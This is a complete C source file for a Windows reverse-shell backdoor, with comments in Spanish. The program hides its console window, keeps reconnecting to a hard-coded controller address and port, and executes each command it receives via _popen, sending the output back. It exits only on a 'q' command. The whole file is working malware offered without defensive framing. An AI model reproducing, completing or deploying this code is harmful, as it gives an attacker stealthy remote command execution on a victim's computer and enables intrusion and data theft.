#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>


#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

void Shell(){

	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (1){

		jump:
		bzero(buffer,1024);
		bzero(container, 1024);
		bzero(total_response, 18384);

		recv(sock, buffer, 1024, 0);

		//Finalizamos el programa con la q
		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else {
			FILE *fp;
			fp = _popen(buffer, "r");
			while (fgets(container, 1024, fp) != NULL){
				strcat(total_response, container);

			}


			send(sock, total_response, sizeof(total_response), 0);

			fclose(fp);
		}

	}


}



int APIENTRY  WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lmCmdLine, int nCmdShow){

	/* Con esta parte escondemos la consola al ejecutar el .exe */
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);


	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData; //Estructura con informacion del socket de Windows
	ServIP = "192.168.1.117";
	ServPort = 50005;




	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0){

		exit(1);

	}

	sock = socket(AF_INET, SOCK_STREAM, 0);


	memset(&ServAddr, 0, sizeof(ServAddr)); //Limpia la variable con 0s, hay que indicar la posicion en memoria

	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);



	//Conectamos al servidor


	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0 ) {

		Sleep(10);


	}

	//Llamamos a la funcion que nos va a dar acceso a la consola
	Shell();

}


